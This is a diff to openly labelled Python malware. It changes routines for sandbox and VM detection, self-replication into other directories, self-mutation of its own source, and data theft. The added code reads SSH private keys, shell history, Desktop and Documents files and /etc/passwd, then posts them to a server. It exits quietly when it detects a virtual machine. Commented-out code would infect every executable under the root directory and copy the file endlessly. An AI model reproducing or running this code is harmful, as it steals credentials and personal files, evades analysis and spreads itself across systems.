@@ -1,12 +1,13 @@
 import os
 import platform
+# Mutation 64412
 import ctypes
-import psutil
+# Mutation 86313
 import shutil
 import random
 import requests
 import time
-import winreg
+# import winreg
 
 
 # Constants for code injection (Windows only)
@@ -61,6 +62,7 @@ def is_virtual_environment():
         except FileNotFoundError:
             pass
         
+# Mutation 36225
         # Alternative check using `lshw` if available
         try:
             output = os.popen('lshw -short').read()
@@ -71,51 +73,6 @@ def is_virtual_environment():
 
         return False
     
-    if platform.system() == "Windows":
-        # Check for VirtualBox specific registry entries
-        try:
-            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System") as key:
-                value, _ = winreg.QueryValueEx(key, "SystemBiosVersion")
-                if "VirtualBox" in value:
-                    return True
-        except FileNotFoundError:
-            pass
-        
-        # Check for VirtualBox specific strings in system information
-        try:
-            import subprocess
-            output = subprocess.check_output("wmic computersystem get model", shell=True).decode()
-            if "VirtualBox" in output:
-                return True
-        except Exception:
-            pass
-        
-        # Check for VirtualBox processes
-        virtualbox_processes = ["VirtualBox.exe", "VBoxService.exe", "VBoxTray.exe"]
-        for proc in virtualbox_processes:
-            try:
-                import psutil
-                for p in psutil.process_iter(['pid', 'name']):
-                    if proc in p.info['name']:
-                        return True
-            except ImportError:
-                print("psutil module is required for process checking")
-                return False
-
-        # Check for VirtualBox services
-        virtualbox_services = ["VBoxService", "VBoxTray"]
-        for service in virtualbox_services:
-            try:
-                import win32serviceutil
-                if win32serviceutil.QueryServiceStatus(service)[1] == win32serviceutil.SERVICE_RUNNING:
-                    return True
-            except ImportError:
-                print("pywin32 module is required for service checking")
-                return False
-            except Exception:
-                pass
-
-        return False
     
 
     return False
@@ -154,26 +111,50 @@ def replicate():
         print(f"Copying to: {target}")
         shutil.copyfile(current_file, target)
 
-def infinite_replicate():
-    current_file = __file__
-    target_dir = os.path.expanduser("~")  # Start in the user's home directory
+#Infinite replicating to overload system
+# def infinite_replicate():
+#     current_file = __file__
+#     target_dir = os.path.expanduser("~")  # Start in the user's home directory
 
-    while True:
-        for i in range(10):  # Limit the number of copies per loop to prevent rapid system overload
-            target_location = os.path.join(target_dir, f"malware_copy_{random.randint(1000, 9999)}.py")
-            shutil.copyfile(current_file, target_location)
-            print(f"Copied to {target_location}")
+#     while True:
+#         for i in range(10):  # Limit the number of copies per loop to prevent rapid system overload
+#             target_location = os.path.join(target_dir, f"malware_copy_{random.randint(1000, 9999)}.py")
+#             shutil.copyfile(current_file, target_location)
+#             print(f"Copied to {target_location}")
 
-        # Recursively replicate to other directories
-        for root, dirs, files in os.walk(target_dir):
-            for name in dirs:
-                new_target_dir = os.path.join(root, name)
-                target_location = os.path.join(new_target_dir, f"malware_copy_{random.randint(1000, 9999)}.py")
-                shutil.copyfile(current_file, target_location)
-                print(f"Copied to {target_location}")
+#         # Recursively replicate to other directories
+#         for root, dirs, files in os.walk(target_dir):
+#             for name in dirs:
+#                 new_target_dir = os.path.join(root, name)
+#                 target_location = os.path.join(new_target_dir, f"malware_copy_{random.randint(1000, 9999)}.py")
+#                 shutil.copyfile(current_file, target_location)
+#                 print(f"Copied to {target_location}")
 
-        # Wait a bit before replicating again to avoid immediate detection
-        time.sleep(5)
+#         # Wait a bit before replicating again to avoid immediate detection
+#         time.sleep(5)
+
+
+
+#Spreading and injecting payload for linux:
+
+# def is_executable(file_path):
+#     """Check if the file is executable."""
+#     return os.path.isfile(file_path) and os.access(file_path, os.X_OK)
+
+# def inject_payload(file_path):
+#     """Inject payload into the file."""
+#     with open(file_path, 'ab') as f:
+#         f.write(payload)
+#     print(f"Injected payload into {file_path}")
+
+# def search_and_inject(base_path):
+#     """Search for executable files and inject payload."""
+#     for root, dirs, files in os.walk(base_path):
+#         for file in files:
+#             file_path = os.path.join(root, file)
+#             if is_executable(file_path):
+#                 inject_payload(file_path)
+                
 
 
 # 4. Mutation
@@ -185,50 +166,67 @@ def mutate():
     lines.insert(mutation_line, f"# Mutation {random.randint(1, 100000)}\n")
 
     with open(__file__, 'w') as f:
+# Mutation 57834
         f.writelines(lines)
 
 # 5. Data Exfiltration
 
-def collect_sensitive_data():
-    # Path to files where sensitive data might be stored
+#Collecting sensitive data for Linux
+
+def get_sensitive_data():
+    # Define the paths to check for sensitive data
     paths = [
-        '/etc/passwd',  # Example file, actual sensitive data should not be stored here
-        '/etc/shadow',  # Example file for passwords (hashed)
+        os.path.expanduser('~/.bash_history'),
+        os.path.expanduser('~/.ssh/id_rsa'),
+        os.path.expanduser('~/Desktop'),
+        os.path.expanduser('~/Documents'),
+        '/etc/passwd',  # Example for Unix-like systems
     ]
     
     sensitive_data = ''
     for path in paths:
         if os.path.exists(path):
-            with open(path, 'r') as f:
-                sensitive_data += f.read()
+            try:
+                with open(path, 'r') as file:
+                    sensitive_data += f'\nContents of {path}:\n'
+                    sensitive_data += file.read()
+            except Exception as e:
+                sensitive_data += f'\nFailed to read {path}: {e}\n'
     
     return sensitive_data
 
-
-def exfiltrate(data, target_url):
+def send_data_to_server(data, server_url):
     try:
-        response = requests.post(target_url, data={'data': data})
+        response = requests.post(server_url, data={'data': data})
         if response.status_code == 200:
-            print("Data exfiltrated successfully")
+            print("Data sent successfully")
         else:
-            print(f"Failed to exfiltrate data, status code: {response.status_code}")
+            print(f"Failed to send data, status code: {response.status_code}")
+            print(response.text)
     except Exception as e:
-        print(f"Failed to exfiltrate data: {e}")
+        print(f"Error sending data: {e}")
+
+
 
 # Main function to run the malware
 def main():
     print(is_virtual_environment())
     if is_virtual_environment():
-        print("Hello")
-    else:
-        print("not VM")
+        return
 
     replicate()
-    infinite_replicate()
+    # infinite_replicate()
     mutate()
-    sensitive_data = collect_sensitive_data()
-    target_url = "http://localhost:8000"  # Use a local server URL for testing
-    exfiltrate(sensitive_data, target_url)
+    # Specify the base directory to start searching
+    base_directory = '/'
+    # search_and_inject(base_directory)
+    
+    # Collect sensitive data
+    sensitive_data = get_sensitive_data()
+
+    # Send sensitive data to the server
+    send_data_to_server(sensitive_data, 'http://localhost:8000/receive')
+
     display_message()
 
 
